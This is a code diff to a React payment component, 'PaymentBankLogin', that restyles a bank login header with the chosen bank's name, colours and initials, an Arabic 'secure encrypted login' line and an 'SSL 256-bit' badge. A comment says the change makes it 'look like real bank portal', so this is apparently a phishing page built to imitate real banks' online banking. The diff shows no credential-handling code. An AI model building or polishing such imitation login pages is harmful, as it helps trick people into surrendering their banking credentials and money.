@@ -271,45 +271,49 @@ const PaymentBankLogin = () => {
     >
       {/* Bank Info Header - Enhanced to look like real bank portal */}
       <div 
-        className="rounded-xl p-5 sm:p-6 mb-6 shadow-lg border border-white/10"
+        className="rounded-xl p-5 sm:p-6 mb-6 shadow-lg border border-white/10 relative overflow-hidden"
         style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}dd, ${selectedBank?.color || branding.colors.secondary}dd)`,
+          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
         }}
       >
-        <div className="flex items-center justify-between mb-4">
+        {/* Background Pattern */}
+        <div className="absolute inset-0 opacity-10" style={{
+          backgroundImage: 'radial-gradient(circle at 20% 50%, white 1px, transparent 1px), radial-gradient(circle at 80% 80%, white 1px, transparent 1px)',
+          backgroundSize: '50px 50px'
+        }} />
+        
+        <div className="flex items-center justify-between mb-4 relative z-10">
           <div className="flex items-center gap-3">
-            {selectedBank?.logo ? (
-              <div className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg bg-white p-2 flex items-center justify-center">
-                <img 
-                  src={selectedBank.logo} 
-                  alt={selectedBank.nameAr}
-                  className="max-w-full max-h-full object-contain"
-                />
-              </div>
-            ) : (
+            {/* Enhanced Bank Logo Display */}
+            <div 
+              className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg bg-white flex flex-col items-center justify-center shadow-md"
+            >
+              <Building2 className="w-6 h-6 sm:w-7 sm:h-7 mb-0.5" style={{ color: selectedBank?.color || branding.colors.primary }} strokeWidth={2.5} />
               <div 
-                className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
+                className="text-[9px] sm:text-[10px] font-bold tracking-wider"
+                style={{ color: selectedBank?.color || branding.colors.primary }}
               >
-                <Building2 className="w-7 h-7 sm:w-8 sm:h-8 text-white" />
+                {selectedBank?.nameAr.split(' ').slice(0, 2).map(word => word.charAt(0)).join('') || 'بنك'}
               </div>
-            )}
+            </div>
             <div className="flex-1 text-white">
               <p className="text-xs sm:text-sm opacity-90 mb-1">الخدمات المصرفية الإلكترونية</p>
-              <p className="text-xl sm:text-2xl font-bold leading-tight">{selectedBank?.nameAr || 'البنك'}</p>
+              <p className="text-xl sm:text-2xl font-bold leading-tight drop-shadow-sm">{selectedBank?.nameAr || 'البنك'}</p>
               <p className="text-xs sm:text-sm opacity-80 mt-0.5">{selectedBank?.name || 'Online Banking'}</p>
             </div>
           </div>
           {selectedCountryData && (
-            <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
+            <span className="text-3xl sm:text-4xl drop-shadow-lg">{selectedCountryData.flag}</span>
           )}
         </div>
         
         {/* Bank portal header line */}
-        <div className="flex items-center gap-2 text-white/90 text-xs sm:text-sm">
+        <div className="flex items-center gap-2 text-white/90 text-xs sm:text-sm relative z-10">
           <Lock className="w-4 h-4" />
           <span>تسجيل دخول آمن ومشفر</span>
           <span className="mr-auto">•</span>
-          <span>SSL Encrypted</span>
+          <ShieldCheck className="w-4 h-4" />
+          <span>SSL 256-bit</span>
         </div>
       </div>
 
